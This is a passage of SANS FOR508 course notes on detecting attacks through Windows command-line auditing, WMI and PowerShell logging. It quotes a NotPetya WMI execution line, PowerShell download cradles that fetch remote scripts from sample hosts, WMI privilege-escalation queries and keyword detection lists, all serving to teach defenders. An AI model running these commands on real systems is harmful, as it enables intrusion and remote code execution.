but they can be incredibly useful on critical servers and systems. This could be the justification you need to get
them turned on (and centrally archived).
Microsoft has indicated it has plans to extend this capability to future operating systems.
[1] Command line process auditing: http://for508.com/uhat4
[2] Microsoft Security Advisory 3004375: http://for508.com/axh-3
Corresponding event IDs in Windows XP/2003: 592 (Security Log—process execution only, no command
line capture)

© 2023 SANS Institute

.

147

.
148

© 2023 SANS Institute

.

Process Tracking with Command Line Auditing

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

149

If command line logging exists, it can be a huge help toward unraveling command line usage. We see here two
different 4688 Process Creation events taken from a domain controller.

.

An ftp execution is seen on the right, and it appears that the adversaries here were encapsulating their ftp
commands in a file (replayed via the “-s” flag in the command line). From this event, we have a date and time
that FTP activity occurred, a compromised account name, and a tool directory/filenaming scheme. Although the
attackers were successful in obscuring their FTP connection IP, recovery of the 1.log file gave this information.
Prior to 2012R2, this event would have shown only that FTP was launched.
On the left is something even more impressive. Here we see a full PowerShell command line. As we see with
some of the stealthier targeted attackers, the PowerShell commands were passed in encoded base64 format.
Amazingly, the full command line was captured by event logging, making it trivial to copy the base64 content
out of the event and decode to recover the PowerShell script.
This type of logging is unquestionably useful, but it will also provide a massive amount of legitimate data. Good
filtering and correlation will be the challenge with this one. Starting with Windows 10 and Server 2016, EID
4688 events include Creator Process Name (previously only Creator Process ID was available). This provides
interesting opportunities for filtering, hunting, and stacking for unusual child processes (e.g., should cmd.exe or
powershell.exe ever be spawned by Microsoft Office processes like Winword.exe?)

© 2023 SANS Institute

.

149

.
150

© 2023 SANS Institute

.

Windows Management Instrumentation (WMI)

Enterprise information management framework
designed to allow access to system data at scale
Management accomplished via scripting (local and remote)
• Baked into Windows since Win2000
• WBEM = Web-Based Enterprise Management
• CIM = Common Information Model
• Open standard defining managed objects, relationships, and shared
information

• Database of system information AND means to automate collection

WMIC = Command line interface for WMI
• Data collection, process execution, eventing …
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

151

What is WMI? Windows Management Instrumentation is Microsoft’s implementation of the WBEM standard. It
has existed all the way back to WindowsNT (NT required an add-on; Win2000 had native support). Out of the
box, WMI provides almost 4,000 different configurable items. If your motherboard has a WMI driver, you can
manage the CPU fan! It was designed to aid in administrating large, distributed environments.

.

As we will see, WMI can be used for a lot more than just data collection. While it does an excellent job of
providing configuration data, it can also be used for a wide range of attacker activity.
WMIC.exe is the traditional portal for executing WMI commands, but it has largely been deprecated in favor of
PowerShell (which has native WMI support). You will likely see both being used interchangeably by attackers
in the wild.

© 2023 SANS Institute

.

151

WMI Attacks

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

WMI is one of the easiest and most stealthy components of many modern attacks. WMI largely requires admin
rights, but once that is accomplished, it opens the door wide for post-exploitation. In fact, every aspect of the
post-exploit kill chain can be accomplished with built-in tools and minimal logging. Attackers have gravitated to
it because it is an excellent way to evade application control and host-based security tools. WMI employs all
trusted, signed binaries, and any scripts required can be easily obfuscated to prevent detection. It is largely
“memory only,” and on the network side, it uses all standard DCOM/PSRemoting traffic, possibly encrypted,
thus blending into a very noisy pipe.
Here we see the entry in the Mitre ATT&CK framework for WMI attacks. It is little wonder why nearly every
modern adversary group now employs WMI within its toolset. As defenders, we need to become much savvier
about how to detect and mitigate this capability.

152

© 2023 SANS Institute

.

152

WMI Attacks: Reconnaissance

wmic process get CSName,Description,ExecutablePath,ProcessId
wmic useraccount list full
wmic group list full
wmic netuse list full
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic startup get Caption,Command,Location,User

…
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

153

In its simplest form WMI is an excellent tool for reconnaissance during an attack. Commands like the ones you
see on this slide are often run shortly after initial exploitation. This should not be surprising, as WMI is equally
good for both admins and attackers to get the lay of the land.

.

Many WMI recon commands are innocuous and quite common in an environment. That can make them
challenging to identify at scale. That being said, your attackers might have a very particular way of querying this
information. If you are capturing command lines, you may be able to take advantage of idiosyncrasies and create
interesting signatures. As an example, if you see the command wmic useraccount list full immediately after a
successful logon to a system, the two events together might help you to identify an attacker’s specific behavior.

© 2023 SANS Institute

.

153

WMI Attacks: Privilege Escalation
# find unquoted services set to auto­start
wmic service get name,displayname,pathname,startmode |findstr /i "Auto"
| findstr /i /v "C:\Windows\\" |findstr /i /v """
# find highly privileged processes that can be attacked
$Owners = @{}
Get­WmiObject ­Class win32_process | Where­Object {$_} | ForEach­Object
{$Owners[$_.handle] = $_.getowner().user}
# find all paths to service .exe's that have a space in the path and aren't quoted
$VulnServices = Get­WmiObject ­Class win32_service | Where­Object {$_}
| Where­Object {($_.pathname ­ne $null) ­and ($_.pathname.trim() ­ne "")} |
Where­Object {­not $_.pathname.StartsWith("`"")} | Where­Object {­not
$_.pathname.StartsWith("'")} | Where­Object
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

WMI is one of the most effective tools for privilege escalation due to the quick insights it can provide into
possible misconfigurations. The de facto tool for this in the wild is the script “PowerUp.ps1”. [1] The script
leverages WMI to query over twenty common misconfigurations that can be used to elevate privileges. This
slide shows three examples of using WMI to look for misconfigurations. Notice how the first example uses
wmic.exe while the others leverage PowerShell-based WMI commands. The former could be detected by
command-line auditing while the latter via PowerShell logging.
• Example 1: Find unquoted service paths set to auto-start, with the service binary not present under Windows
folder
• Example 2: Find highly privileged processes that can be attacked
• Example 3: Find all service paths that have a space in them and are not quoted (similar to Example 1)
[1] PowerShellEmpire/PowerTools: http://for508.com/wuobm

154

© 2023 SANS Institute

.

154

WMI Attacks: Lateral Movement
• Remote execution via WMI == “process call create”
• This example shows code from NotPetya and BadRabbit ransomware

wmic.exe PROCESS CALL CREATE \"C:\\Windows\\System32\\rundll32.exe
\\\"C:\\Windows\\perfc.dat\\\" #1
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

155

Crimeware has rapidly incorporated these latest attack techniques to exploit vulnerabilities. It often gives us a
great example of how to employ the latest and greatest techniques. This was especially evident in the recent
outbreak of the very advanced destructive malware of WannaCry, NotPetya, and BadRabbit.

.

This example shows NotPetya utilizing wmic process call create to execute code. We see it running a legitimate
version rundll32.exe to execute whatever code is present in “C:\Windows\perfc.dat”.
“WMIC process call create” was designed to allow local and remote code execution. You can think of it as a
built-in version of PsExec with a lot more stealth! As we will see, any time you see “process call create” in a
command line, it is worth investigating, especially if it contains the “node:/” option, facilitating remote
execution.
NotPetya also uses WMIC to find and spread to remote shares (using NetEnum/NetAdd). It has the capability to
duplicate the token of the current logged in user, or the use of collected usernames and passwords.[1]
[1] New ransomware, old techniques: Petya adds worm capabilities – http://for508.com/3mxle

© 2023 SANS Institute

.

155

Capturing WMI Command Lines

✓ Event Logs (EID 4688)
✓ Microsoft Sysmon
✓ Commercial EDR tools
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

If you can’t capture a command line like the one in this slide in your enterprise, you are nearly blind to the
majority of WMI-based attacks. You might be able to see wmic running on systems, but that is not unusual in
most environments. The command line here shows us the telltale “process call create” element of WMIC,
combined with a suspicious Visual Basic Script (also in a suspicious folder). Command line auditing makes this
trivial to discover, but without it, we would have to work very hard with traditional forensics to identify this
activity (which does not scale).
If you want to detect the full range of WMI attacks, your first priority absolutely has to be to get command line
auditing. Luckily, that isn’t hard these days. We just covered command-line auditing (EID 4688), and Microsoft
has backported this native ability to record command lines in Process Tracking events all the way back to
Windows 7. Perhaps an even better option is the free Microsoft Sysinternals tool Sysmon. Sysmon is highly
targeted toward malicious activity and can be more easily filtered to ensure the resulting logs do not overwhelm
your collection capabilities (we will see an example of Sysmon later in this section). Finally, the latest
generation of endpoint detection and response tools also typically include the native capability to record
command lines. This historical data can be particularly useful for scoping an environment once activity and
tradecraft is discovered. The example shown on this slide is from the CrowdStrike Falcon EDR tool and shows
an unusual visual basic script being executed from an unusual location via the often abused “wmic process call
create” command.

156

© 2023 SANS Institute

.

156

Auditing WMI Persistence (1)

Scenario
• Easily audit for malicious WMI event consumer persistence

Relevant Event IDs
•5858 records query errors, including host and username
• 5857-5861 record filter/consumer activity
• 5861 is the most useful: new permanent event consumer creation

Investigative Notes
• Microsoft-Windows-WMI-Activity%4Operational.evtx
• Enabled by default on Win10+ and Win2012R2+
• Event Filter and Consumer recorded in logs
• Both CommandLineEvent and ActiveScriptEvent consumers are logged
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

157

Malicious WMI event consumers have exploded in popularity since they were introduced to the world by
Stuxnet. This is largely due to them being very effective and very difficult to find on a system (especially at
scale). You may recall from our section on persistence that setting up WMI persistence requires three discrete
steps:

2.
3.

An event filter must be created describing a specific trigger to detect (for example, trigger every twenty
seconds).
An event consumer is added to the system with a script and/or executable to run (run a PowerShell script to
beacon to a command and control server).
Finally, the event and consumer are tied together via a binding, and the persistence mechanism is loaded
into the WMI repository.

.

1.

We would typically need to query systems using PowerShell or rely on WMI trace logs (which are nearly
useless) to audit available WMI filters and consumers. Luckily, beginning with Windows Server 2012R2, a new
set of event log entries has been made available to easily audit for this very pernicious attack. To audit for WMI
event filter/consumer activity, we will review the WMI-Activity/Operational log. Event ID 5861 is by far the
most useful, as it records any permanent consumer introduced into the local WMI repository. WMI event
consumers identify what will be executed upon the trigger of a WMI event filter, and hence make it easy to spot
evil. Look for any unusual executables, PowerShell, or VBScript references, as these are by the far the most
common vectors abused by attackers and advanced malware. Event ID 5857 can be useful to track loaded
provider DLLs (evil DLLs extending WMI). Event ID 5858 includes the hostname and username when logging
WMI query errors. This data can be useful to identify lateral movement using WMI via tools like WinRM.
Look for known compromised accounts and connections from remote hosts. The WMI error codes are
documented by Microsoft.[1]
Unfortunately, this source of data is not particularly useful for detecting other types of WMI attacks (at this
time). We are hopeful that Microsoft will continue to improve auditing of WMI similar to what they have done
for PowerShell. Until then, command-line auditing is your best bet for hunting for other types of WMI attacks.
[1] WMI Error Constants: https://for508.com/ihmcx
Corresponding event IDs in Windows XP/2003: None
© 2023 SANS Institute

.

157

Auditing WMI Persistence (2)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In this example, we see a 5861 event indicating a new WMI event consumer creation. This type of event can be
rare in many enterprises (some environments have routine consumers created by software, but they are usually
very identifiable and easy to allowlist). Its rarity makes it an excellent artifact to audit. Since the event also
records the full consumer information, you should pay attention to any unusual executables, PowerShell, or
VBScript references, as these are by far the most common vectors abused by attackers and advanced malware.
Here we see an encoded PowerShell script has been set as the consumer. This is definitely something we would
want to investigate, and it would be trivial to extract the base64 encoded PowerShell script from this output for
analysis. Further, we could cross-reference this event with a corresponding EID 5859 event to identify the
chosen filter (trigger) for this consumer.

158

© 2023 SANS Institute

.

158

.
© 2023 SANS Institute

.

159

Quick Wins in the WMI-Activity/Operational Log
• WMI-Activity log is best used to discover evil WMI eventing
• EID 5861: New permanent consumers
• Allowlist “normal” WMI event consumers in your environment

• Do not expect to find WMIC command lines
• Requires process tracking/command line auditing in Security log

• The log can provide insight into more obscure WMI attacks
• EID 5857 tracks loaded provider DLLs (evil DLLs extending WMI)
• EID 5858 includes hostname and username – search for known bad

• Search for uncommon keywords to identify anomalies:
CommandLine

ActiveScript

scrcons

wbemcons

powershell

eval

.vbs

.ps1

ActiveXObject

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The WMI-Activity/Operational log has been updated in Win10/Server2012R2+ to include far better logging of
WMI eventing than ever before. In fact, it makes identification of malicious event consumers almost trivial.
There is a lot of noise in this log, so the analyst needs to stay focused. Event ID (EID) 5861 is a great first
choice, since the event consumer is often the easiest to identify as evil. Here you will be looking for
CommandLine and ActiveScript consumers running suspicious executables, PowerShell commands, or scripts.
Note that you will see legitimate consumers in almost every enterprise. However, these should be relatively
standard and easy to allowlist. Some common legitimate consumer names are: SCM Event Log, BVTFilter,
TSlogonEvent.vbs, TSLogonFilter, RAevent.vbs, RmAssistEventFilter, KernCap.vbs, NTEventLogConsumer,
and WSCEAA.exe (Dell). Be careful here! Attackers have been seen in the wild using names similar to these
legitimate ones (such as SCM Event Consumer) to blend in.
Beyond just looking at the event consumers, search the log for terms that are often present in suspicious activity.
PowerShell, eval, .vbs, .ps1, and ActiveXObject all frequently occur in malicious WMI events. Scrcons is the
process responsible for ActiveScript consumers, and wbemcons.dll is loaded (EID 5857) when a command line
event consumer is started. Looking at log entries in different ways may help identify missed malicious activity.
Errors in the log may also help you identify interesting activity. You may see a bad provider failing to load or
errors due to insufficient permissions. EID 5858 records hostname (labeled ClientMachine) and account name
(labeled User) information which can identify activity from known compromised hosts or accounts.
What you should not expect to find are WMIC or WMI remoting command lines. This log does not record this
information. To capture this important data, command line auditing is required in the Security log or via Sysmon
logging. If you have this type of logging, this is a place where threat hunting can be paramount. The vast
majority of WMI attacks follow directly from the latest published research by the pen test community, so
staying up to date is critical. It is also a good reason to employ Red Teams that use similar capabilities so you
can test your defenses and detection mechanisms. Memory auditing and analysis is another way to level the
playing field between defenders and attackers using WMI techniques. We will see examples of this when we
cover memory forensics later in the course.

160

© 2023 SANS Institute

.

160

PowerShell-Specific Logging

Scenario

• Log PowerShell activity including pipeline output, full script conten ts executed by a
user, and PowerShell remoting instances.

Relevant Event IDs

•4103: Module logging and pipeline output
• 4104: Script block logging
• 4105/4106: Script Start/Stop (not recommended)

Investigative Notes
•Microsoft-Windows-PowerShell%4Operational.evtx (PS v5)
• Microsoft-Windows-PowerShellCore%4Operational.evtx (PSv6, 7)
• “Useful” logging available beginning with PowerShell version 5
• Beware downgrade attacks to circumvent logging: powershell –Version 2

• Script block logging includes scripts and some deobfuscation
• Windows PowerShell.evtx log is older, but still useful (EID 400 / 800)
• WinRM/Operational log records inbound and outbound PowerShell remoting
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

161

.

PowerShell is ubiquitous in the Microsoft ecosystem and although it makes administrators lives much easier, it
opens a nearly unprecedented suite of capabilities for attackers. Nearly every malicious activity imaginable is
possible with PowerShell, including privilege escalation, credential stealing, data destruction, and data
exfiltration. There is even a pure PowerShell dumper for Kerberos tickets! PowerShell is commonly used by
most adversaries in the wild, is difficult to restrict access to, and has historically been difficult to audit. The
release of PowerShell version 5 (finally) provided a robust logging capability.[1]
This artifact might be the only help you have when trying to piece together what happened via PowerShell
(imagine you see PowerShell.exe executed via Prefetch or a process in memory and want to dig deeper). Module
logging and the new script block logging provide amazing insight into PowerShell activity. A script block can be
thought of as a collection of code accomplishing a task. Script blocks can be as simple as a function or as fullfeatured as a script calling multiple cmdlets. Script block auditing can capture the full command or contents of
the script, who executed it, and when it occurred. Audits are recorded as event log entries in the MicrosoftWindows-PowerShell/Operational log regardless of how PowerShell was executed—from a command
shell, from the integrated scripting environment (ISE), or via custom hosting of PowerShell components. Event
ID 4104 records the script block contents, but only the first time it is executed in an attempt to reduce log
volume. Many practitioners have come to the conclusion that EID 4105/4106 events (PowerShell execution) are
too noisy to be useful for threat hunting.
Sadly, most logging is not enabled by default so the data might not be available when you need it. However,
Microsoft did enable a built-in feature to automatically log any suspicious scripts, even if script block logging is
disabled. This is an awesome step in the right direction and will certainly be valuable for those investigators
savvy enough to review the Microsoft-Windows-PowerShell/Operational log even in
organizations that have not yet enabled full auditing. When digging deep, it can also be useful to look at Event
IDs 400 and 800 in the older Windows PowerShell.evtx log. Traditionally, this log had little useful
information, but it seems nearly every log is recording more interesting data after the release of PSv5.
PowerShell “Core” versions 6 and 7 are rewrites of PowerShell using .NET Core, allowing PowerShell to be
cross-platform on Windows, macOS, and Linux. It is important to note that the “Core” versions of PowerShell
are intended to coexist with PowerShell version 5, and not be replacements. They are installed in separate
locations, have separate group policy parameters, and have separate logs (as seen on this slide). If you have both
© 2023 SANS Institute

.

161

versions installed, you need to turn-on script-block logging for both! Currently, turning on script block logging
in PowerShell “Core” versions requires adding administrative templates to your domain controller. [2] Once
completed, enabling logging is very similar (though under the PowerShell Core policies). Script block logging
for these versions will be present in Microsoft-Windows-PowerShellCore%4Operational.evtx.
While these versions of PowerShell are likely to take some time to be widely deployed, we need to learn from
past mistakes and ensure auditing is enabled upon first deployment of any new versions. Attackers are aware of
the power of PowerShell logging, and actively take steps to avoid it. It is very likely they will move to PSv7
when available to take advantage of the likelihood of less logging. This also means you will need to review both
logs when responding to systems with both versions installed!
A final log, Microsoft-Windows-WinRM/Operational log, tracks WinRM connections, which
happens to be the primary protocol for PowerShell remoting. The log is available on both source and destination
systems (a big win), and records the destination hostname, IP, and currently logged-on user (Event ID 6), as well
as the source of session creation (Event ID 91) and the authenticating user account (Event ID 168).
While this is a lot of data to review, the sum total of these logs can be THE critical resource when tracking
malicious use of PowerShell.

.

PowerShell version 2 downgrade attacks can circumvent logging and render PowerShell logging techniques less
useful, as most of the commands and scripts will not show in the event logs and the ConsoleHost_history and
Transcript logs. You can detect invocation of the PowerShell 2.0 engine via Event IDs 400 in the older
Windows PowerShell.evtx log by searching for “EngineVersion=2.0” or “HostVersion=2.0”.
Command-line auditing is also useful to detect this attack by looking for variants of the powershell –
Version 2 command. It is recommended to disable and remove PowerShell v2 from as many systems in your
environment as possible. This antiquated version significantly enlarges the attack surface due to lack of
logging.[3] Downgrade attacks are not possible if it is not installed.

[1] PowerShell Loves the Blue Team: http://for508.com/9rlm2
[2] PowerShell Core Logging | Cybersecthreat: https://for508.com/wjlkq
[3] Detecting and Preventing PowerShell Downgrade Attacks | Precision Computing: https://for508.com/qgex8

162

© 2023 SANS Institute

.

Enabling PowerShell Logging
• Enabled via Administrative Template (Group Policy)
• Script Block = cmdlets, functions, full scripts
• Any use of PS → shell, ISE, or custom implementations

• PSv5 records entire script
• Only the first time run

• PSv5 also includes automatic logging of
suspicious scripts
• Look for “Warning” events

• Recommendations:
• Module, Script Block, and Transcription logs
• Increase default log sizes
• Centralize your logs
• Create filters to search for indicators
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

163

.

PowerShell logs are undeniably a crucial forensic artifact that nearly every organization needs. Sadly, most
logging is not enabled by default, so the data will not be available unless active steps are taken to enable logging
in the enterprise. Microsoft did enable limited default logging for suspicious scripts containing blocklisted
components (look for events logged as “Warning”), but a robust logging capability requires some configuration
work upfront.
A module logging capability has been present since PowerShell v3 but was traditionally difficult to instrument
and very unlikely to be used in most organizations (interestingly, it becomes more useful in PSv5). The most
important logging capability occurred with the release of PowerShell v5 when the new script block logging
capability was added. Script block auditing can capture the full command or contents of the script, who executed
it, and when it occurred. Audits are recorded as event log entries in the Microsoft-WindowsPowerShell/Operational log regardless of how PowerShell was executed—from a command shell, the
integrated scripting environment (ISE), or via custom hosting of PowerShell components. Event ID 4104
records the script block contents, but only the first time it is executed in an attempt to reduce log volume.
A strong PowerShell auditing policy should include Module Logging, PowerShell Script Block Logging, and
PowerShell Transcription. Each of these provide different insight into PowerShell usage and can help form a
complete picture of malicious activity. If PowerShell is common in the network, these logs can be noisy, and
thus increasing the default log size is highly recommended. FireEye has provided guidance of a size of 1GB to
try to attain up to a year’s worth of activity.[1] An even better alternative is to centralize these logs in a repository
that can be searched, filtered, and hunted through. PowerShell attacks are constantly evolving and finding them
will undoubtedly require humans to develop clever new detection filters.
Enabling PowerShell logging is straightforward. Using Group Policy Management, edit the policy and browse to
Computer Configuration > Policies > Administrative Templates > Windows Components > Windows
PowerShell. From here, right-click to select each property you wish to edit (see slide graphic). Note that Module
Logging requires a list of modules to audit, and the most complete option is to select all (“*”). We previously
discussed the additional steps necessary for logging PowerShell “Core” versions.
[1] Greater Visibility Through PowerShell Logging: http://for508.com/3a-kz
© 2023 SANS Institute

.

163

PowerShell Automatic Logging of Malicious Scripts

Example Blocklist

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

One of the most exciting features of newer versions of PowerShell (v5+) is the ability to log entire script blocks.
Although this capability would be incredibly useful when tracking an attacker or rogue administrator using
PowerShell in your network, the security team at Microsoft realized that this will likely be one of those features
that is often not looked at until after a bad event has occurred. Clearly, the usefulness of this capability rests on
having it turned on before a malicious event occurs. Hence, a capability was added to automatically identify
potentially malicious script blocks and automatically log them in the PowerShell/Operational log. Microsoft has
basically implemented an “alert list” of dangerous PowerShell commands that will auto-log when used.
Researcher Nasreddine Bencherchali extracted this list from the associated DLL file, and it is worth a review if
you are interested in this capability.[1] This is a tremendous feature ensuring there will at least be some useful
PowerShell logging present for forensic investigations, regardless of the audit policy.
Note that Windows will label events it finds suspicious as EID 4104 “Warning” events. This can help the analyst
distinguish from other EID 4104 events and perhaps be a first filter run to narrow the focus to events that
Windows already identified. It can also be used as a pre-filter for centralizing events from this log if getting all
EID 4104 events proves to be too much data.
In this example, the system was not configured to log PowerShell script blocks, but we still see a 4104 event
indicating that a script block was recorded. An action within the script matched the signatures used to trigger
automatic logging. Note that the script in its entirety is included in the event but even looking at the first part
(seen in the slide) gives a clue we might be looking at something interesting (key.log = key logger?). In fact, this
script turned out to be a slightly modified version of the PowerSploit “Get-Keystrokes” key logging script. [2]
There are likely several reasons it was flagged, but at least one red flag is its use of dynamic assemblies and
reflection (think loading .NET code on the fly in memory). Keep in mind there will be false positives logged—
for every malicious use of a PowerShell feature, there is always a legitimate use that can be found. If the event
turns out to be something worth looking into, the user account executing the script block and a date and time are
also logged.
[1] List of suspicious strings used by PowerShell SuspiciousContentChecker function: https://for508.com/8rkmt
[2] PowerSploit—A PowerShell Post-Exploitation Framework: http://for508.com/pmyxa

164

© 2023 SANS Institute

.

164

.
© 2023 SANS Institute

.

165

PowerShell Syntax to Achieve Stealth
Powershell –w Hidden –nop –noni –exec bypass IEX (New-Object
System.Net.WebClient.downloadstring(‘http://squirreldirectory.com/a’)
Command-Line

Purpose

-WindowStyle hidden (-w hidden)

Sets the window style to hidden (do not show window)

-NoProfile (-Nop)

Does not load the Windows PowerShell profile

-NonInteractive (-Noni)

Does not present an interactive prompt to the user

-ExecutionPolicy Bypass (-Exec Bypass)

Evade any limits on script execution

Invoke-Expression (IEX)

Execute arbitrary commands (dangerous and rarely used)

(New-Object
System.Net.Webclient).DownloadFile()

Download a file or script from a remote network location

-EncodedCommand (-E, -Enc)

Accepts a base-64 encoded version of a script
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

We have already seen many instances of suspicious PowerShell in this class. Like many attacker behaviors,
there is a limited set of syntax frequently used to make malicious PowerShell activity more difficult to discover.
This slide covers some of the most seen parameters in the wild.[1] PowerShell syntax is very flexible, and
parameters can be abbreviated in a mind-boggling number of ways. The abbreviations seen on this slide are
only the beginning of what you might encounter. With luck, you might find an attacker (or script) that reliably
uses the same abbreviations, but this flexibility is one of the reasons it is difficult to write indicators of
compromise for PowerShell usage.
While (New-Object System.Net.Webclient).DownloadFile() predominates within many
attack frameworks, it is not the only way to download files using PowerShell. Also, keep an eye out for
commonly abused commands like Start-BitsTransfer and Invoke-WebRequest.
[1] Microsoft Docs About PowerShell.exe (common parameters): https://for508.com/fg-dh

166

© 2023 SANS Institute

.

166

Quick Wins in the PowerShell/Operational Log
• Events may capture different parts of an attack
• 4103 records module/pipeline output
• 4104 records code (scripts) executed (look for “Warning” events)

• The PowerShell download cradle sees heavy use in the wild:
IEX (New-Object Net.Webclient).downloadstring("http://bad.com/bad.ps1")

• Filter using commonly abused keywords
download

Start-Process

FromBase64String

powershell -version

IEX

Invoke-Expression

WebClient

Invoke-WmiMethod

rundll32

Invoke-Command

bitstransfer

Invoke-CimMethod

http

syswow64

Reflection

WebRequest

• Look for obvious signs of encoding and obfuscation
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

As PowerShell becomes ubiquitous in the enterprise, it is likely that you will find a lot of legitimate scripts
recorded in the PowerShell/Operational log. Your task as an analyst is to find any evil that may be hiding among
that legitimate activity. While EID 4104 events (script block logging) are the latest and greatest in the
PowerShell auditing world, do not ignore the older EID 4103 (module logging) events. Both events log activity
from different perspectives. Module logging focuses on PowerShell pipeline execution. Almost every command
uses several modules or cmdlets, and EID 4103 events can include variables, commands, interim output, and
even some deobfuscation. Script logging (EID 4104) records the code blocks executed, providing excellent
deobfuscation, including dynamically generated script contents, but typically no output. Note that Windows will
label events it finds suspicious as EID 4104 “Warning” events. This can help the analyst distinguish from other
EID 4104 events and perhaps be a good first filter run to narrow the focus to events that Windows already
identified. You may see duplicate information between the two event types, but you may also find important
differences that allow a deeper understanding of an attack.
The most dangerous (and common) PowerShell attack in the wild today is the download cradle. It uses the
benign PowerShell executable (or elements thereof) to execute file-less, memory-only malicious scripts
downloaded from the internet. This slide shows the most generic version of the cradle, but as you might
imagine, attackers have developed many ways to change or obfuscate elements to better hide from security
software. The good news is obfuscation is almost by definition going to look strange to an analyst. The bad news
is that the analyst has a lot of log entries to scour to find the obfuscated commands. A good list of keywords to
start searching for is present on this slide. Each one of these keywords can be obfuscated by attackers, but
usually one or more will provide solid hits, particularly since PowerShell logging also often includes the
deobfuscated version of scripts. Just like hunting using other artifacts, defenders must continually be creative to
find the new ways attackers use to hide their activity. If you are interested in a larger list of possible dangerous
PowerShell keywords to look for, “secprentice” published an interesting set on GitHub.[1]
[1] Secprentice PowerShell Watchlist: https://for508.com/bw29a

© 2023 SANS Institute

.

167

167

PowerShell Script Obfuscation
• Obfuscation is heavily used in modern PS attacks
• Evade security software
• Frustrate analysis efforts

• Easy to recognize during analysis, but difficult at scale
• Excellent reason to use PSv5 script block logging (some automatic decoding)
• Integration with Antimalware Scanning Interface (AMSI)
• Character frequency analysis (Revoke-Obfuscation project)
Example of (worst-case) PowerShell obfuscation:
( ‘…..’|%{${#/~} =+ $()}{ ${@}=${#/~}} { ${/.} = ++${#/~}}{ ${*~}=(${#/~} =${#/~}
+${/.})} {${$./} =(${#/~}= ${#/~} + ${/.} )}{${)@}=( ${#/~}=${#/~}+${/.} )} { ${‘}
=(${#/~} =${#/~}+ ${/.}) } { ${;} = ( ${#/~}=${#/~} + ${/.}) } {${ *-}= (
${#/~}=${#/~}+${/.})} {${“[+} = ( ${#/~} =${#/~} +${/.} ) } …
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

As antivirus, enterprise detection and response tools, and logging have improved on detecting suspicious
PowerShell, attackers have developed ingenious ways to defeat simple keyword detection. PowerShell is
incredibly flexible, and that flexibility allows a seemingly endless array of different ways to write the same
script. Projects like Invoke-Obfuscation by Daniel Bohannon have paved the way to better understanding just
how serious the problem is.[1] Criminal syndicates and crimeware have pushed capabilities further, leading to
examples like the one on this slide, which is nearly unintelligible.[2] Believe it or not, you are looking at a variety
of variable names, such as ${#/~), that are being concatenated together to eventually spell out a PowerShell
download cradle using the BITS transfer service.
The good news is that if you see this, you will almost certainly know it is suspicious. The bad news is the nearly
limitless ways things can be changed makes automated detection much harder. All is not lost, however.
PowerShell script block logging will often provide at least some decoding of scripts. Windows 10 released the
Antimalware Scanning Interface (AMSI) that security vendors can tie into to (hopefully) audit code at the point
of execution, regardless of how many times it has been encoded and obfuscated. And projects like RevokeObfuscation have started to use advanced techniques like feature extraction and character frequency analysis to
identify strange looking scripts found within PowerShell logs.[3] Revoke-Obfuscation is quite exciting and is
designed to run directly against the PowerShell/Operational logs (individually or at scale).
[1] Invoke-Obfuscation: http://for508.com/eqhpy
[2] Dissecting the Mindscrew: http://for508.com/ctz3s
[3] Revoke-Obfuscation: http://for508.com/x87yh

168

© 2023 SANS Institute

.

168

CyberChef
• Web app for encryption, encoding, and compression analysis
• Excellent for identifying (and decoding) a wide range of obfuscation
• “Magic” mode for automated encoding detection

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

169

CyberChef is one of the more exciting tools to be released to the public for decoding an enormous range of data
formats. The tool was open-sourced by the UK GCHQ and describes itself on its public GitHub page[1]:

.

“CyberChef is a simple, intuitive web app for carrying out all manner of "cyber" operations within a web
browser. These operations include simple encoding like XOR or Base64, more complex encryption like AES,
DES and Blowfish, creating binary and hexdumps, compression and decompression of data, calculating hashes
and checksums, IPv6 and X.509 parsing, changing character encodings, and much more. The tool is designed to
enable both technical and non-technical analysts to manipulate data in complex ways without having to deal
with complex tools or algorithms.”
Two features you should be aware of with this tool is the capability to run a local instance of the web app (the
online version of the tool is really for demo purposes), and the new “Magic” decoder, which attempts to intuit
the correct recipe for decoding input, even through multiple iterations of different encoding schemes (like what
is found in a lot of malicious scripts). This “Magic” option can be a useful first step when trying to understand
highly obfuscated PowerShell.
CyberChef is an excellent tool, but for some of the most advanced and mind-bending obfuscation, you (or your
reverse engineer) may need to code a decryptor. The PSDecode project is a great example of an open-source
decoding script and Mari Degrazia has presented on her efforts to use Python to defeat some of the more
insidious encoding schemes.[2, 3]
[1] CyberChef: http://for508.com/tfxj6
[2] PSDecode: http://for508.com/87kil
[3] Finding and Decoding Malicious PowerShell Scripts: http://for508.com/polg3

© 2023 SANS Institute

.

169

.
170

© 2023 SANS Institute

.

PowerShell Transcript Logs (1)
• Logs all commands typed and the output of those commands
• Only records input/output to the PowerShell terminal
• Very different contents from Script Block Logging
• Less storage required compared to other PowerShell logs

• Available in PowerShell v4+, not enabled by default
• Written to \Users\<account>\Documents by default
• Each session written in text format in daily folders and timestamped
• Output Directory option allows forwarding (e.g., to a write-only share)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

171

.

PowerShell transcript logs have been available since PowerShell version 2, but they largely required the StartTranscript command be executed before activity or placed in each user’s profile.ps1 file. PowerShell now
natively includes transcription logging, and it is highly recommended for the modern enterprise. Transcription
logging can be enabled globally using Group Policy in Computer Configuration/Administrative
Templates/Windows Components/Windows PowerShell/Turn on PowerShell
Transcription.
Each type of PowerShell logging has advantages, and transcript logs provide something the others do not: the
exact contents of what was displayed in the PowerShell terminal. This includes both inputs (commands) and
what was displayed following those commands (even if the user didn’t necessarily see them due to something
like PowerShell remoting). As an example, imagine an attacker ran the Mimikatz credential dumping tool via
